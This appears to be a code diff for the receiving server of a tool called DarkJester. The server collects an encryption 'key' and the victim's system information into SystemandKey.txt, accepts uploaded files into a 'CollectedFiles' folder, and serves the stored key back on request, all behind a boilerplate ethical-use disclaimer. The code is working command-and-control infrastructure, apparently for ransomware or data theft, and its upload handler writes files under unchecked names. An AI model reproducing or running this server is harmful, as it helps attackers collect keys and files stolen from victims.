@@ -1,3 +1,22 @@
+import http.server
+import socketserver
+import json
+import os
+import signal
+import sys
+import cgi
+
+if len(sys.argv) != 2:
+    print(f"Usage: {sys.argv[0]} <PORT>")
+    sys.exit(1)
+
+IP = "0.0.0.0"
+try:
+    PORT = int(sys.argv[1])
+except ValueError:
+    print("[!] Port must be an integer.")
+    sys.exit(1)
+
 banner = r"""
 ________                __        ____.                __
 \______ \ _____ _______|  | __   |    | ____   _______/  |_  ___________
@@ -9,24 +28,12 @@ ________                __        ____.                __
 
 Disclaimer: DarkJester is intended solely for ethical and legitimate uses. We are not responsible for any malicious activities or unlawful actions that occur as a result of using DarkJester. It is your responsibility to ensure that the tool is used in compliance with all applicable laws and regulations. Misuse of DarkJester for harmful, illegal, or unauthorized purposes is strictly prohibited and will be at your own risk.
 """
-import logging
-from flask import Flask, request, jsonify
-import os
-import signal
-import sys
 
-class NullHandler(logging.Handler):
-    def emit(self, record):
-        pass
-
-logging.getLogger().addHandler(NullHandler())
-logging.getLogger().setLevel(logging.CRITICAL)
-
-app = Flask(__name__)
-data_store = {}
 file_name_output = 'SystemandKey.txt'
 upload_folder = 'DarkJesterCollectedFiles'
 os.makedirs(upload_folder, exist_ok=True)
+
+data_store = {}
 
 def save_data_to_file():
     with open(file_name_output, 'w') as f:
@@ -36,61 +43,100 @@ def save_data_to_file():
         for k, v in system_info.items():
             f.write(f" {k}: {v}\n")
 
-@app.route('/store-key', methods=['POST'])
-def store_key():
-    key_data = request.get_json()
-    key = key_data.get('key')
-    system_info = key_data.get('system_info')
-    if key and system_info:
-        data_store['key'] = key
-        data_store['system_info'] = system_info
-        save_data_to_file()
-        print(f"[+] Key: {key}")
-        print("[+] System Information:")
-        for k, v in system_info.items():
-            print(f" {k}: {v}")
-        shutdown_server()
-        return jsonify({"message": "[+] Key and system information stored successfully"}), 200
-    return jsonify({"error": "[-] Key or system information is missing"}), 400
+class CustomHandler(http.server.BaseHTTPRequestHandler):
+    def log_message(self, format, *args):
+        return
 
-@app.route('/get-key', methods=['GET'])
-def get_key():
-    key = data_store.get('key')
-    if key:
-        return jsonify({"key": key}), 200
-    return jsonify({"error": "[-] Key not found"}), 404
+    def do_POST(self):
+        if self.path == '/store-key':
+            content_length = int(self.headers['Content-Length'])
+            post_data = self.rfile.read(content_length)
+            try:
+                key_data = json.loads(post_data)
+                key = key_data.get('key')
+                system_info = key_data.get('system_info')
+                if key and system_info:
+                    data_store['key'] = key
+                    data_store['system_info'] = system_info
+                    save_data_to_file()
+                    print(f"[+] Key: {key}")
+                    print("[+] System Information:")
+                    for k, v in system_info.items():
+                        print(f" {k}: {v}")
+                    self.respond(200, {"message": "[+] Key and system information stored successfully"})
+                    shutdown_server()
+                    return
+                self.respond(400, {"error": "[-] Key or system information is missing"})
+            except json.JSONDecodeError:
+                self.respond(400, {"error": "[-] Invalid JSON format"})
 
-@app.route('/get-system-info', methods=['GET'])
-def get_system_info():
-    system_info = data_store.get('system_info')
-    if system_info:
-        return jsonify({"system_info": system_info}), 200
-    return jsonify({"error": "[-] System information not found"}), 404
+        elif self.path == '/upload':
+            content_type, params = cgi.parse_header(self.headers['Content-Type'])
+            if content_type != 'multipart/form-data':
+                self.respond(400, {"error": "[-] Invalid content type"})
+                return
 
-@app.route('/upload', methods=['POST'])
-def upload_file():
-    if 'file' not in request.files:
-        return jsonify({"error": "[-] No file part"}), 400
-    file = request.files['file']
-    if file.filename == '':
-        return jsonify({"error": "[-] No selected file"}), 400
-    try:
-        file_path = os.path.join(upload_folder, file.filename)
-        file.save(file_path)
-        print(f"[+] File {file.filename} uploaded successfully.")
-        return jsonify({"message": "[+] File uploaded successfully"}), 200
-    except Exception as e:
-        print(f"[-] Error uploading file: {e}")
-        return jsonify({"error": "[-] Error uploading file"}), 500
+            boundary = params['boundary'].encode('utf-8')
+            content_length = int(self.headers['Content-Length'])
+            body = self.rfile.read(content_length)
+
+            parts = body.split(boundary)
+            for part in parts:
+                if b'Content-Disposition' in part:
+                    disposition = part.split(b'\r\n')[1].decode('utf-8')
+                    if 'filename' in disposition:
+                        filename = disposition.split('filename="')[1].split('"')[0]
+                        file_data = part.split(b'\r\n\r\n')[1].split(b'\r\n--')[0]
+                        file_path = os.path.join(upload_folder, filename)
+                        try:
+                            with open(file_path, 'wb') as f:
+                                f.write(file_data)
+                            print(f"[+] File {filename} uploaded successfully.")
+                            self.respond(200, {"message": "[+] File uploaded successfully"})
+                        except Exception as e:
+                            print(f"[-] Error uploading file: {e}")
+                            self.respond(500, {"error": "[-] Error uploading file"})
+                        return
+            self.respond(400, {"error": "[-] No file found in the request"})
+
+    def do_GET(self):
+        if self.path == '/get-key':
+            key = data_store.get('key')
+            if key:
+                self.respond(200, {"key": key})
+            else:
+                self.respond(404, {"error": "[-] Key not found"})
+
+        elif self.path == '/get-system-info':
+            system_info = data_store.get('system_info')
+            if system_info:
+                self.respond(200, {"system_info": system_info})
+            else:
+                self.respond(404, {"error": "[-] System information not found"})
+        else:
+            self.send_error(404, "Not Found")
+
+    def respond(self, status_code, response_dict):
+        response_json = json.dumps(response_dict)
+        self.send_response(status_code)
+        self.send_header("Content-Type", "application/json")
+        self.send_header("Content-Length", str(len(response_json)))
+        self.end_headers()
+        self.wfile.write(response_json.encode('utf-8'))
 
 def shutdown_server():
-    func = request.environ.get('werkzeug.server.shutdown')
-    if func:
-        func()
-    else:
-        os.kill(os.getpid(), signal.SIGINT)
+    os.kill(os.getpid(), signal.SIGINT)
 
-if __name__ == '__main__':
-    print(banner)
-    print("[+] Server is now listening.....")
-    app.run(host='0.0.0.0', port=5000, debug=False)
+if __name__ == "__main__":
+    with socketserver.TCPServer((IP, PORT), CustomHandler) as httpd:
+        try:
+            print(banner)
+            print(f"[+] Server is now listening on {IP}:{PORT}...")
+            try:
+                httpd.serve_forever()
+            except KeyboardInterrupt:
+                print("[*] Server Shutting Down....")
+                httpd.server_close()
+        except KeyboardInterrupt:
+            http.server_close()
+
